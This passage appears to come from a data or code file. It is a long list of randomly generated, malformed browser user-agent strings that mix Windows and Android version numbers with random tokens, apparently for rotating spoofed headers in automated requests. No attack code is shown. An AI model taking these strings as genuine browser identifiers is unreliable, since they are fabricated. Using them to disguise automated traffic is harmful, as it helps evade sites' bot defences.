(Windows NT 10.0; 10; Win64; x64)O474X) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4638.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Q268R) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4353.41 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)C975P) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4537.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)B792C) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4657.93 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N392S) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4778.65 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)I701U) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4791.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)E786K) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4742.41 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)L580Z) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4796.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Z338U) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4787.68 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)D790G) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4543.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A817V) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4493.121 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Z96J) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4326.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)F134D) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4489.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)E520F) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4692.54 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)N190E) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4579.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T243T) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4582.66 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)M192B) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4449.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)M388V) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4698.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)R604G) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4481.105 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)W949F) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4856.78 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)W190L) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4866.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A68X) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4617.63 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)K789C) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4708.129 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)O217D) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4543.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A875Y) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4533.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)H64V) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4268.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)R649A) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4561.95 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)V309L) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4303.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)T769C) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4649.129 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O207X) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4867.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)I589E) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4213.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Z350I) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4769.92 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B36Q) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4238.121 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)G519V) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4512.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L26U) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4442.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G283U) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4806.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)S576N) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4275.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T500F) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4727.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)I955S) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4808.123 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)V593U) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4255.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)P311E) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4461.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Y106Z) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4729.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N847A) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4688.137 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)V346D) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4226.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)H686O) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4578.124 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L736R) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4479.54 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)K948C) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4573.82 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A774O) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4769.96 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A515E) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4393.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)I401Q) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4710.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B678X) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4234.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)K778K) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4686.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)H3R) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4668.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A182A) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4592.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L84Y) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4876.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)S700L) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4267.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)M906R) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4759.108 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H562N) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4454.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)B617O) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4500.107 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T488Q) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4520.129 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)C640D) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4744.121 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z836C) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4728.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)H968T) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4205.108 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)U605M) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4599.100 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N17Z) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4793.147 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)R290J) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4269.55 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C263Q) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4378.48 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)L828U) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4900.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K797H) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4675.119 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y628S) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4498.110 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q429E) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4631.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q902L) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4336.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)I516Y) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4425.138 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)N606C) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4421.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)K515B) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4694.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)L45C) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4260.55 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)M817A) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4706.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)U13T) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4442.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N450Q) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4239.70 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)K275D) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4635.71 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)W687P) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4676.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)V420I) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4307.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)U778P) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4440.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)S522C) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4817.46 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L96A) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4512.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F10L) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4409.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H64M) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4650.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)J759C) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4261.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)C995V) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4819.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)E479X) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4855.90 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)T453I) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4302.99 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)M325U) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4867.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)E9D) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4772.54 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)B601F) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4640.122 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)M665F) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4214.145 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F757T) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4787.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H226B) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4254.129 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)U8P) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4377.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J623G) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4430.138 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)U473K) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4646.147 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N363S) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4709.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H32D) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4299.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)C37U) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4458.44 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)M155G) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4555.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H173G) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4663.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)S934V) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4484.75 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)J672E) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4871.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N178V) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4737.70 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)W984N) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4865.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)K156Q) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4248.120 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G580I) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4374.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)L580A) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4722.110 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)F743M) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4437.144 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)L157E) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4438.66 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)X242N) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4510.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)M265O) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4580.65 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)X197F) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4250.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)C290Y) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4300.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P614C) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4650.79 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A510A) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4483.61 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)B434V) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4740.110 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)F216G) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4517.49 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)C33O) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4859.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)C485Z) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4516.60 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)S250K) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4459.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N964I) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4607.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)X326J) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4458.70 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)S83U) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4242.86 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)R39I) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4333.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)T751H) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4895.61 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)O778Z) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4645.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)V621S) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4812.48 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)V735P) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4794.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)F84B) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4379.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)N117G) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4690.143 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)F105T) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4251.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N737P) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4414.107 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)V409K) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4835.117 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Z952A) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4372.93 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)S621C) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4461.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)K355W) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4896.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)T484W) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4664.68 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)U241N) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4485.86 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)G268V) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4277.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)G568F) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4333.122 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)W439A) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4276.68 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)D641I) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4513.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)V139T) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4280.107 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)F298W) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4654.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)F500O) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4419.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)A676W) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4311.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)F62W) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4858.65 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)C208V) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4869.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)L943A) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4775.46 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)S308L) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4342.77 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G400X) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4209.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F131T) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4656.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)D821Z) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4274.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)E557S) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4519.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F775G) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4789.63 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)U954A) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4592.123 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G492G) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4329.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)F855V) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4509.123 